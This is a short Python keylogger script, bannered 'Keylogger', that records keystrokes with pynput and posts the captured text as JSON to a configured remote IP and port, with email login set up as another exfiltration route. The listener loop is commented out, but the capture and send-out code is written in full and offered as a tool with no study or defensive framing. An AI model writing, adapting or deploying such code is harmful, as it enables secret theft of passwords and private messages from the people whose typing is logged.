from pynput import keyboard
from requests import post
from threading import Timer
from json import dumps
from commands import Configs
from os.path import basename

def send_post_req() -> None:
    global text, configs
    if configs.ip is not None:
        try:
            payload = dumps({"keyboardData" : text})
            post(f"http://{configs.ip}:{configs.port}", data=payload, headers={"Content-Type" : "application/json"})
            # timer = Timer(TIME_INTERVAL, send_post_req)
            # timer.start()
        except:
            print("Couldn't complete request!")
    else:
        try:
            pass
        except:
            print("Couldn't complete request!")

def on_press(key):
    global text, configs
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.esc:
        send_post_req()
        return False
    else:
        text += str(key).strip("'")


# --------------------------------------------------------------------------------------------------

text = ""
configs= Configs(basename(__file__))
configs.email.emailLogin()

# TIME_INTERVAL = 10
print(f'''
    _______ _______ _______ _______ _______ _______ _______ _______ _______ 
    |\     /|\     /|\     /|\     /|\     /|\     /|\     /|\     /|\     /|
    | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
    | |   | | |   | | |   | | |   | | |   | | |   | | |   | | |   | | |   | |
    | |K  | | |e  | | |y  | | |l  | | |o  | | |g  | | |g  | | |e  | | |r  | |
    | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
    |/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|

''')
print(f'''Sending keys to: {f'{configs.ip}:{configs.port}' if configs.ip else configs.email}''')

# with keyboard.Listener(on_press=on_press) as listener:
#     # send_post_req()
#     listener.join()